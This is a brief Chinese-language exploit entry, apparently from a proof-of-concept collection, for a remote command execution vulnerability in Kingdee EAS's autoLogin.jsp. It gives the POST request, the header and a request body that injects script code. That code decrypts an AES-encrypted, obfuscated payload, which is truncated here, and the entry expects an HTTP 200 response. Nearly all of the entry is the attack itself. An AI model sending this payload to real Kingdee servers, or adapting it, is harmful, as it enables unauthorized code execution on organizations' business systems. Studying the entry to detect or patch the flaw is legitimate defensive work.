# 金蝶EASautoLogin.jsp存在远程代码执行漏洞

- **系统**：金蝶　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /easportal/autoLogin.jsp HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
defaultPage=/autoLogin.jsp?defaultPage=/BIReport&json=1);var i="opijiaas";var a=com.kingdee.eas.csinterface.util.AES.decryptToString("Ek+8kmyzOHNqGo1UKdt4NlGU52blbdkMelN7bcXW/ojupJrhhqviZaefOQdPaUbjTPICgST1wSBHcaVYV8OxXdWDUmUKr1Quk0PBx+XeW8Fb76VdD0c5G6V6u/FM5uoBTjBLA8S4PzeTCJJrSaiIs1k7apal+GZbRR16CN/2Vtov3htYHXLLRg+LnXxZbrVUfZafPWULElnJSajjzNIC1jlrlW6WLBfijNAX+hobz3jlbsXMf4t3riDzxLpIcCQX/ksyFrFNbV4vIrwMWlDI8hmoAoqhLZ0ASDYW77SjBObPRRlFrary/4VfpwFCPx7e22TsHdLwY8cAwS6/XVOrjOyA71xOyQbAu4C/9fPgh+xNyBStFz2RESDr73T1l61uAgYyCCoiAXZn3+SIIcJKeE1N/Klyc7OlNPvMBdj/yXO5vjHzK2Jd144LemlcPx1AcFY3ksmjA3b2t/Dc1o…（脚本共 2568 字，完整版见原文）
```
- **预期**：200　|　—